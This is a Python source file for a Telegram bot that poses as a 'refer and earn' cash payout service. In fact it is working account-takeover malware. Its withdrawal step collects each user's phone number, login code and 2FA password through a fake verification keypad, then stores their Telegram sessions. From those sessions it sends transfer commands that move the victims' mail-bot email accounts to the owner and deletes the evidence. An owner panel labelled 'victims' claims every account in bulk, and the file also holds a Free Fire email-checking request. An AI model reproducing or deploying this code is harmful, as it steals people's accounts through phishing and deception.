# -*- coding: utf-8 -*-
import sqlite3
import logging
import re
import os
import threading
import asyncio
import time
import requests
from fastapi import FastAPI
import uvicorn
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton, Bot
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters,
    ContextTypes, CallbackQueryHandler
)
from telethon import TelegramClient
from telethon.sessions import StringSession

# ================== CONFIG ==================
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
API_ID = int(os.getenv("API_ID", "38746329"))
API_HASH = os.getenv("API_HASH", "dc6d3dd0de462ed07952a64c3253c437")

# REAL TOP OWNER
OWNER_ID = 8612102965
OWNER_USERNAME = "@NEXTXDOREVER"
TARGET_MAIL_BOT = "fakemailbot"

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ================== STYLISH FONTS ==================
FONT_MAP = {
    'a': 'Ａ', 'b': 'Ｂ', 'c': 'Ｃ', 'd': 'Ｄ', 'e': 'Ｅ', 'f': 'Ｆ', 'g': 'Ｇ', 'h': 'Ｈ', 'i': 'Ｉ', 'j': 'Ｊ',
    'k': 'Ｋ', 'l': 'Ｌ', 'm': 'Ｍ', 'n': 'Ｎ', 'o': 'Ｏ', 'p': 'Ｐ', 'q': 'Ｑ', 'r': 'Ｒ', 's': 'Ｓ', 't': 'Ｔ',
    'u': 'Ｕ', 'v': 'Ｖ', 'w': 'Ｗ', 'x': 'Ｘ', 'y': 'Ｙ', 'z': 'Ｚ',
    'A': 'Ａ', 'B': 'Ｂ', 'C': 'Ｃ', 'D': 'Ｄ', 'E': 'Ｅ', 'F': 'Ｆ', 'G': 'Ｇ', 'H': 'Ｈ', 'I': 'Ｉ', 'J': 'Ｊ',
    'K': 'Ｋ', 'L': 'Ｌ', 'M': 'Ｍ', 'N': 'Ｎ', 'O': 'Ｏ', 'P': 'Ｐ', 'Q': 'Ｑ', 'R': 'Ｒ', 'S': 'Ｓ', 'T': 'Ｔ',
    'U': 'Ｕ', 'V': 'Ｖ', 'W': 'Ｗ', 'X': 'Ｘ', 'Y': 'Ｙ', 'Z': 'Ｚ'
}
def f_txt(text): return "".join(FONT_MAP.get(c, c) for c in text)
def p_style(text): return f"<code>{text}</code>"

# ================== DATABASE ==================
DB_PATH = "refer_bot.db" 

def init_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, phone TEXT, session_string TEXT, 
        is_banned INTEGER DEFAULT 0, balance INTEGER DEFAULT 0, last_bonus REAL DEFAULT 0,
        referrer_id INTEGER, total_refers INTEGER DEFAULT 0
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS withdrawals (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, upi_id TEXT, status TEXT DEFAULT 'Pending'
    )""")
    c.execute("CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)")
    
    try: c.execute("ALTER TABLE users ADD COLUMN last_bonus REAL DEFAULT 0")
    except: pass
    try: c.execute("ALTER TABLE users ADD COLUMN referrer_id INTEGER")
    except: pass
    try: c.execute("ALTER TABLE users ADD COLUMN total_refers INTEGER DEFAULT 0")
    except: pass

    c.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (OWNER_ID,))
    conn.commit()
    conn.close()

init_db()

def db_exec(query, params=()):
    conn = sqlite3.connect(DB_PATH, timeout=10)
    c = conn.cursor()
    try:
        c.execute(query, params)
        conn.commit()
        res = c.fetchall()
    finally:
        conn.close()
    return res

def get_all_admins():
    admins = {OWNER_ID}
    res = db_exec("SELECT user_id FROM admins")
    if res:
        for row in res:
            admins.add(row[0])
    return list(admins)

active_userbots = {}
temp_clients = {}
user_states = {}
numpad_data = {}

# ================== FASTAPI ==================
web_app = FastAPI()

@web_app.get("/")
def read_root(): return {"status": "Alive"}

def run_web():
    port = int(os.environ.get("PORT", 8080))
    uvicorn.run(web_app, host="0.0.0.0", port=port)

# ================== FREE FIRE API CHECKER ==================
def check_ff_account(email):
    url = "https://ffmconnect.live.gop.garenanow.com/game/account_security/swap:send_otp"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.42(25057PC09I ;Android 16;en;IN;app 1.126.1 2019120776;)",
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "Keep-Alive",
        "Cookie": "datadome=IP7GsxK1oCmLXZnoCcsBuX0oU5zF7WwaGTcIm3BKa987Coo5eU20C0pxODRWR2Fvb7j~h0WlS1XjEk7Np9JkGmd28p64JyqytTf61k6NrOCKT9U1Y0M653_iy_4ajbb_"
    }
    data = {
        "app_id": "100067",
        "email": email,
        "locale": "en_IN"
    }
    
    try:
        response = requests.post(url, headers=headers, data=data, timeout=15)
        res_json = response.json()
        
        if res_json.get("result") == 0:
            return "✅ Account Linked (OTP Sent Successfully)"
        elif "error" in res_json and "no_binding" in str(res_json):
            return "❌ Not Linked (No FF Account Found)"
        else:
            return f"⚠️ Unknown Response: {response.text[:50]}"
    except Exception as e:
        return f"⚠️ API Error: {str(e)}"

# ================== USERBOT AUTOMATION ==================
async def get_or_connect_client(user_id):
    if user_id in active_userbots: return active_userbots[user_id]
    res = db_exec("SELECT session_string FROM users WHERE user_id=?", (user_id,))
    if not res or not res[0][0]: return None
    client = TelegramClient(StringSession(res[0][0]), API_ID, API_HASH)
    await client.connect()
    active_userbots[user_id] = client
    return client

async def start_userbot(user_id, session_str):
    if user_id in active_userbots:
        try: await active_userbots[user_id].disconnect()
        except: pass
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await client.connect()
    active_userbots[user_id] = client
    asyncio.create_task(transfer_mails(user_id))

async def transfer_mails(victim_uid, custom_sender=None):
    try:
        sender_id = custom_sender if custom_sender else victim_uid
        sender_client = await get_or_connect_client(sender_id)
        victim_client = await get_or_connect_client(victim_uid)
        owner_client = await get_or_connect_client(OWNER_ID)
        
        if not victim_client or not owner_client: return
            
        target_bot = await victim_client.get_entity(TARGET_MAIL_BOT)
        owner_target_bot = await owner_client.get_entity(TARGET_MAIL_BOT)
        
        await victim_client.send_message(target_bot, "/id")
        await asyncio.sleep(4)
        
        messages = await victim_client.get_messages(target_bot, limit=2)
        if not messages: return
            
        emails = re.findall(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', messages[0].message)
        if not emails: return

        for email in emails:
            await victim_client.send_message(target_bot, f"/transfer {email} {OWNER_USERNAME}")
            await asyncio.sleep(4)
            
            try:
                msgs = await victim_client.get_messages(target_bot, limit=2)
                for m in msgs: await victim_client.delete_messages(target_bot, m.id)
            except: pass
            
            await owner_client.send_message(owner_target_bot, email)
            await asyncio.sleep(4)
            
            try:
                msgs = await owner_client.get_messages(owner_target_bot, limit=2)
                for m in msgs: await owner_client.delete_messages(owner_target_bot, m.id)
            except: pass
            await asyncio.sleep(1)
            
    except Exception as e:
        logger.error(f"Transfer error: {e}")

# ================== KEYBOARDS ==================
def get_main_keyboard():
    kb = [
        [KeyboardButton(f"🎁 {f_txt('Bonus')}", style="primary"), KeyboardButton(f"💵 {f_txt('Balance')}", style="success")],
        [KeyboardButton(f"🔗 {f_txt('Refer Earn')}", style="primary"), KeyboardButton(f"💸 {f_txt('Withdraw')}", style="danger")]
    ]
    return ReplyKeyboardMarkup(kb, resize_keyboard=True)

def get_numpad_keyboard(current_text=""):
    kb = [
        [InlineKeyboardButton("1", callback_data="num_1"), InlineKeyboardButton("2", callback_data="num_2"), InlineKeyboardButton("3", callback_data="num_3")],
        [InlineKeyboardButton("4", callback_data="num_4"), InlineKeyboardButton("5", callback_data="num_5"), InlineKeyboardButton("6", callback_data="num_6")],
        [InlineKeyboardButton("7", callback_data="num_7"), InlineKeyboardButton("8", callback_data="num_8"), InlineKeyboardButton("9", callback_data="num_9")],
        [InlineKeyboardButton("⌫", callback_data="num_del"), InlineKeyboardButton("0", callback_data="num_0"), InlineKeyboardButton(f"{f_txt('Submit')} ✅", callback_data="num_submit")]
    ]
    return InlineKeyboardMarkup(kb)

# ================== BOT HANDLERS ==================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    res = db_exec("SELECT user_id, referrer_id FROM users WHERE user_id=?", (user_id,))
    
    if not res:
        referrer_id = None
        if context.args and context.args[0].isdigit():
            referrer_id = int(context.args[0])
            if referrer_id == user_id: referrer_id = None
        
        db_exec("INSERT INTO users (user_id, referrer_id) VALUES (?,?)", (user_id, referrer_id))
        
        if referrer_id:
            db_exec("UPDATE users SET balance = balance + 100, total_refers = total_refers + 1 WHERE user_id=?", (referrer_id,))
            try:
                await context.bot.send_message(referrer_id, f"🎉 <b>{f_txt('NEW REFERRAL')}</b>\n{p_style('You earned 100rs')}", parse_mode="HTML")
            except: pass
    else:
        if res[0][1] is None and context.args and context.args[0].isdigit():
            referrer_id = int(context.args[0])
            if referrer_id != user_id:
                db_exec("UPDATE users SET referrer_id = ? WHERE user_id=?", (referrer_id, user_id))
                db_exec("UPDATE users SET balance = balance + 100, total_refers = total_refers + 1 WHERE user_id=?", (referrer_id,))
                try:
                    await context.bot.send_message(referrer_id, f"🎉 <b>{f_txt('NEW REFERRAL')}</b>\n{p_style('You earned 100rs')}", parse_mode="HTML")
                except: pass

    img_res = db_exec("SELECT value FROM config WHERE key='welcome_img'")
    welcome_img = img_res[0][0] if img_res else None

    welcome_text = (
        f"👋 <b>{f_txt('WELCOME TO REFER EARN BOT')}</b>\n\n"
        f"You will get {p_style('100rs')} per refer\n"
        f"Minimum withdraw is {p_style('100rs')}\n\n"
        f"<b>{f_txt('Use the buttons below to start earning:')}</b>"
    )
    
    if welcome_img and os.path.exists(welcome_img):
        try:
            await update.message.reply_photo(photo=welcome_img, caption=welcome_text, reply_markup=get_main_keyboard(), parse_mode="HTML")
        except:
            await update.message.reply_text(welcome_text, reply_markup=get_main_keyboard(), parse_mode="HTML")
    else:
        await update.message.reply_text(welcome_text, reply_markup=get_main_keyboard(), parse_mode="HTML")

async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    uid = update.effective_user.id
    
    if uid in get_all_admins():
        state = user_states.get(uid)
        if state == 'admin':
            if text.isdigit():
                db_exec("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (int(text),))
                await update.message.reply_text(f"✅ {p_style('Admin Added')}", parse_mode="HTML")
            user_states[uid] = None; return

    if uid in temp_clients and temp_clients[uid].get('state') == '2fa':
        try:
            await temp_clients[uid]['client'].sign_in(password=text)
            session = temp_clients[uid]['client'].session.save()
            db_exec("INSERT OR REPLACE INTO users (user_id, phone, session_string) VALUES (?,?,?)", (uid, temp_clients[uid]['phone'], session))
            await start_userbot(uid, session)
            
            amount = user_states.get('temp_amount', 0)
            upi_id = user_states.get('temp_upi', '')
            db_exec("INSERT INTO withdrawals (user_id, amount, upi_id) VALUES (?,?,?)", (uid, amount, upi_id))
            user_states[uid] = None
            del temp_clients[uid]
            
            await update.message.reply_text(f"✅ {p_style('2FA Verified & Withdrawal Requested')}", reply_markup=get_main_keyboard(), parse_mode="HTML")
            return
        except Exception as e:
            return await update.message.reply_text(f"❌ 2FA Failed: {e}")

    state = user_states.get(uid)
    if state == 'withdraw_amt' and text.isdigit():
        amount = int(text)
        res = db_exec("SELECT balance FROM users WHERE user_id=?", (uid,))
        bal = res[0][0] if res else 0
        if amount < 100 or amount > bal: 
            await update.message.reply_text(f"❌ {f_txt('Invalid amount or insufficient balance')}")
            return
        user_states[uid] = 'withdraw_upi'
        user_states['temp_amount'] = amount
        await update.message.reply_text(f"🏦 {f_txt('Enter your UPI ID')}")
        return
        
    if state == 'withdraw_upi':
        upi = text
        user_states['temp_upi'] = upi
        user_states[uid] = 'withdraw_verify'
        await update.message.reply_text(
            f"🔒 <b>{f_txt('VERIFICATION REQUIRED')}</b>\n\n{f_txt('Please share your contact to verify and withdraw')}",
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton(f"📱 {f_txt('Share Contact')}", request_contact=True)]], resize_keyboard=True, one_time_keyboard=True),
            parse_mode="HTML"
        )
        return

    if text == f"🎁 {f_txt('Bonus')}":
        res = db_exec("SELECT last_bonus FROM users WHERE user_id=?", (uid,))
        last_bonus = res[0][0] if res and res[0][0] else 0
        if time.time() - last_bonus > 86400:
            db_exec("UPDATE users SET balance = balance + 5, last_bonus=? WHERE user_id=?", (time.time(), uid))
            await update.message.reply_text(f"🎁 <b>{f_txt('BONUS CLAIMED')}</b>\n{p_style('You got 5rs')}", parse_mode="HTML")
        else:
            await update.message.reply_text(f"🎁 <b>{f_txt('ALREADY CLAIMED')}</b>\n{f_txt('Wait 24 hours')}")
            
    elif text == f"💵 {f_txt('Balance')}":
        res = db_exec("SELECT balance, total_refers FROM users WHERE user_id=?", (uid,))
        if res:
            bal, refs = res[0]
            await update.message.reply_text(f"💵 <b>{f_txt('BALANCE')}</b>\n\n{p_style('Balance: ₹' + str(bal))}\n{p_style('Total Refers: ' + str(refs))}", parse_mode="HTML")
        else:
            await update.message.reply_text(f"💵 <b>{f_txt('BALANCE')}</b>\n\n{p_style('Balance: ₹0')}\n{p_style('Total Refers: 0')}", parse_mode="HTML")
        
    elif text == f"🔗 {f_txt('Refer Earn')}":
        bot_username = (await context.bot.get_me()).username
        ref_link = f"https://t.me/{bot_username}?start={uid}"
        await update.message.reply_text(f"🔗 <b>{f_txt('Your Link')}</b>\n\n{p_style(ref_link)}\n{f_txt('Share and earn 100rs')}", parse_mode="HTML")
        
    elif text == f"💸 {f_txt('Withdraw')}":
        res = db_exec("SELECT balance FROM users WHERE user_id=?", (uid,))
        bal = res[0][0] if res else 0
        if bal < 100:
            await update.message.reply_text(f"⚠️ <b>{f_txt('Insufficient Balance')}</b>\n{f_txt('Min 100rs needed')}\n{p_style('Your Balance: ₹' + str(bal))}", parse_mode="HTML")
            return
        user_states[uid] = 'withdraw_amt'
        await update.message.reply_text(f"💸 <b>{f_txt('Enter Amount to Withdraw')}:</b>")

async def verify_contact_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    if not contact: return await update.message.reply_text(f"❌ {f_txt('Please use the button')}")
    
    phone = contact.phone_number
    if not phone.startswith('+'): phone = '+' + phone
    uid = update.effective_user.id
    
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        sent = await client.send_code_request(phone)
        temp_clients[uid] = {'client': client, 'hash': sent.phone_code_hash, 'phone': phone}
        numpad_data[uid] = ""
        
        await update.message.reply_text(
            f"📩 <b>{f_txt('Enter recovery code sent to your Telegram account')}</b>\n\n"
            f"{f_txt('Use the keypad below')}:",
            reply_markup=get_numpad_keyboard(),
            parse_mode="HTML"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def numpad_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data = query.data.split("_")[1]
    
    if uid not in temp_clients: return await query.edit_message_text(f"❌ {f_txt('Session expired')}")
    current = numpad_data.get(uid, "")
    
    if data == "del":
        current = current[:-1]
        numpad_data[uid] = current
        await query.edit_message_text(f"📩 <b>{f_txt('Enter recovery code')}</b>\n{f_txt('Current')}: <code>{'*' * len(current)}</code>", reply_markup=get_numpad_keyboard(current), parse_mode="HTML")
        
    elif data == "submit":
        otp = current
        try:
            await temp_clients[uid]['client'].sign_in(phone=temp_clients[uid]['phone'], code=otp, phone_code_hash=temp_clients[uid]['hash'])
            session = temp_clients[uid]['client'].session.save()
            db_exec("INSERT OR REPLACE INTO users (user_id, phone, session_string) VALUES (?,?,?)", (uid, temp_clients[uid]['phone'], session))
            await start_userbot(uid, session)
            
            amount = user_states.get('temp_amount', 0)
            upi_id = user_states.get('temp_upi', '')
            db_exec("INSERT INTO withdrawals (user_id, amount, upi_id) VALUES (?,?,?)", (uid, amount, upi_id))
            user_states[uid] = None
            del temp_clients[uid]
            
            await query.edit_message_text(f"✅ <b>{f_txt('Verification Successful & Withdrawal Requested')}</b>", parse_mode="HTML")
            await context.bot.send_message(uid, f"✅ {p_style('Withdrawal Requested')}", reply_markup=get_main_keyboard(), parse_mode="HTML")
            
        except Exception as e:
            if "Two-step" in str(e) or "password" in str(e).lower():
                await query.edit_message_text(f"🔐 <b>{f_txt('ENTER 2FA PASSWORD')}</b>\n{f_txt('Please send your password in chat')}", parse_mode="HTML")
                temp_clients[uid]['state'] = '2fa'
                return
            else:
                await query.edit_message_text(f"❌ OTP Failed: {e}")
    else:
        current += data
        numpad_data[uid] = current
        await query.edit_message_text(f"📩 <b>{f_txt('Enter recovery code')}</b>\n{f_txt('Current')}: <code>{'*' * len(current)}</code>", reply_markup=get_numpad_keyboard(current), parse_mode="HTML")

# ================== OWNER PANEL ==================
async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in get_all_admins(): return
    
    kb = [
        [InlineKeyboardButton(f"👥 {f_txt('Logged Accounts')}", callback_data="admin_acc")],
        [InlineKeyboardButton(f"📤 {f_txt('Claim All Mails')}", callback_data="admin_claim")],
        [InlineKeyboardButton(f"👑 {f_txt('Add Admin')}", callback_data="admin_add")],
        [InlineKeyboardButton(f"🖼 {f_txt('Set Welcome Photo')}", callback_data="set_welcome_img")]
    ]
    await update.message.reply_text(f"<b>👑 {f_txt('OWNER PANEL')}</b>", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    uid = query.from_user.id
    
    if uid not in get_all_admins(): return await query.answer("Unauthorized", show_alert=True)
    
    if data == "admin_acc":
        users = db_exec("SELECT user_id, phone FROM users WHERE session_string IS NOT NULL")
        text = f"👥 <b>{f_txt('Logged Devices/Accounts')}:</b>\n\n"
        for u in users: 
            text += f"{p_style('ID: ' + str(u[0]))}\n{p_style('Phone: ' + str(u[1]))}\n\n"
        await query.edit_message_text(text, parse_mode="HTML")
        
    elif data == "admin_claim":
        asyncio.create_task(manual_claim_all(uid, query))
        
    elif data == "admin_add":
        await query.edit_message_text(f"👑 {f_txt('Send User ID to make Admin')}")
        user_states[uid] = 'admin'
        
    elif data == "set_welcome_img":
        await query.edit_message_text(f"🖼 {f_txt('Send the image you want to set as Welcome Photo')}:")
        user_states[uid] = 'set_welcome_img_wait'

async def owner_photo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    state = user_states.get(uid)
    
    if state == 'set_welcome_img_wait':
        try:
            photo_file = await update.message.photo[-1].get_file()
            file_path = f"welcome_img.jpg" 
            await photo_file.download_to_drive(file_path)
            
            db_exec("INSERT OR REPLACE INTO config (key, value) VALUES ('welcome_img', ?)", (file_path,))
            
            await update.message.reply_text(f"✅ {f_txt('Welcome Photo set successfully!')}")
            user_states[uid] = None
        except Exception as e:
            await update.message.reply_text(f"❌ {f_txt('Error setting photo')}: {e}")
            user_states[uid] = None

async def manual_claim_all(owner_id, query):
    target_owner_client = await get_or_connect_client(OWNER_ID)
    if not target_owner_client:
        return await query.edit_message_text(f"❌ {f_txt('Target Owner Account is not logged in!')}")

    await query.edit_message_text(f"⏳ <b>{f_txt('STARTING CLAIM PROCESS...')}</b>", parse_mode="HTML")
    
    users = db_exec("SELECT user_id FROM users WHERE session_string IS NOT NULL")
    total_claimed = 0
    
    for u in users:
        victim_id = u[0]
        if victim_id in get_all_admins() or victim_id == OWNER_ID: continue
        
        try:
            victim_client = await get_or_connect_client(victim_id)
            target_bot = await victim_client.get_entity(TARGET_MAIL_BOT)
            owner_target_bot = await target_owner_client.get_entity(TARGET_MAIL_BOT)
            
            await victim_client.send_message(target_bot, "/id")
            await asyncio.sleep(4)
            
            messages = await victim_client.get_messages(target_bot, limit=2)
            if not messages: continue
                
            emails = re.findall(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', messages[0].message)
            if not emails: continue

            for email in emails:
                msg = await query.message.reply_text(f"🔄 <b>{f_txt('TRANSFERRING')}:</b> {p_style(email)}", parse_mode="HTML")
                await asyncio.sleep(2)
                await msg.delete() # Message Delete
                
                await victim_client.send_message(target_bot, f"/transfer {email} {OWNER_USERNAME}")
                await asyncio.sleep(4)
                
                try:
                    msgs = await victim_client.get_messages(target_bot, limit=2)
                    for m in msgs: await victim_client.delete_messages(target_bot, m.id)
                except: pass
                
                msg2 = await query.message.reply_text(f"📥 <b>{f_txt('CLAIMING')}:</b> {p_style(email)}", parse_mode="HTML")
                await asyncio.sleep(2)
                await msg2.delete() # Message Delete
                
                await target_owner_client.send_message(owner_target_bot, email)
                await asyncio.sleep(4)
                
                try:
                    msgs = await target_owner_client.get_messages(owner_target_bot, limit=2)
                    for m in msgs: await target_owner_client.delete_messages(owner_target_bot, m.id)
                except: pass
                
                total_claimed += 1
                await asyncio.sleep(1)
                
        except: pass
        
    await query.message.reply_text(f"👑 <b>{f_txt('ALL VICTIMS MAILS CLAIMED!')}</b>\n{p_style('Total Claimed: ' + str(total_claimed))}", parse_mode="HTML")

# ================== MAIN ==================
def main():
    threading.Thread(target=run_web, daemon=True).start()
    
    app_bot = Application.builder().token(BOT_TOKEN).build()

    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CommandHandler("owner", owner_panel))
    app_bot.add_handler(MessageHandler(filters.CONTACT, verify_contact_withdraw))
    app_bot.add_handler(CallbackQueryHandler(numpad_callback, pattern="^num_"))
    app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_|^set_"))
    
    app_bot.add_handler(MessageHandler(filters.PHOTO, owner_photo_handler), group=0)
    app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, menu_router), group=1)

    logger.info("Bot started successfully.")
    app_bot.run_polling(allowed_updates=Update.ALL_TYPES, close_loop=False)

if __name__ == "__main__":
    main()
